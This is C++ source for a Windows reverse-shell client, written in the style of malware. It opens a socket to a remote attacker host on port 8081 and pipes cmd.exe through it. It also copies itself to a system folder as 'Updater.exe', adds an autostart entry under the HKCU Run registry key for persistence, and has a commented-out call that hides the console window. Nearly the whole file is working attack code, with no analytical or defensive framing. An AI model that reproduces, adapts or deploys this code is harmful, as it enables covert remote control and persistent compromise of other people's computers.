#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <codecvt>
#include <locale>
#include <iostream>
#include <algorithm>
#include <string>
#include <regex>

using namespace std;
#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
#define BUFSIZE MAX_PATH
void BindSock(char* rhost, int rport);

void MooveExe() {
	char path[MAX_PATH + 1] = "";
	DWORD len = GetCurrentDirectoryA(MAX_PATH, path);
	strcat_s(path, "\\Client_shell.exe");

	cout << path << "\n";

	string str2 = regex_replace(path, std::regex("\\\\"), "\\\\");
	const char* test = str2.c_str();
	cout << test << "\n";
	cout << "Copying to C:\\Windows\\Tasks\\Updater.exe";
	CopyFileA(test, "C:\\Windows\\Tasks\\Updater.exe", true);
}

int main(int argc, char** argv) {
	//FreeConsole(); // This is the way to make the cmd vanish
	char rhost[] = "XXXXX"; // ip to connect to
	int rport = 8081;
		

	MooveExe();
	cin.get();
	//BindSock(rhost, rport);
	return 0;	
}


void CreateKey() {
	std::wstring progPath = L"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Updater.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}
void BindSock(char* rhost, int rport) {
	/*while (1) {*/
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	// Initialize Winsock
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		printf("WSAStartup function failed with error: %d\n", iResult);
		return;
	}
	printf("[*] Winsock init ... \n");
	//init socket props
	SOCKET sock;
	sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (sock == INVALID_SOCKET) {
		printf("socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	printf("[*] Sock init ... \n");
	//Filling struc props
	struct sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	InetPtonA(AF_INET, rhost, &(clientService.sin_addr));
	clientService.sin_port = htons(rport);

	printf("[*] attempting to connect \n");
	iResult = WSAConnect(sock, (SOCKADDR*)&clientService, sizeof(clientService), NULL, NULL, NULL, NULL);
	if (iResult == SOCKET_ERROR) {
		printf("[!] connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(sock);
		if (iResult == SOCKET_ERROR)
			printf("[!] closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	printf("[X] Sock Connected\n");

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

	printf("[*] Created process props\n");

	CHAR commandLine[255];
	strcpy_s(commandLine,255,"cmd.exe");

	CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
